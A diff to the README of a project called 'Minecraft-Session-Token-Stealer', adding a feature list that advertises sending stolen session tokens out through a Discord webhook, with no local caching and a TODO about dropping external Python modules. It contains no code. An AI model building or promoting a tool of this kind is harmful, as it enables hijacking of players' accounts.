@@ -1,2 +1,6 @@
 # Minecraft-Session-Token-Stealer
- Token stealer for Minecraft
+
+# Features
+ - No local caching
+ - Transferring via Discord webhook
+ - [ ] No external Python modules needed **TODO**
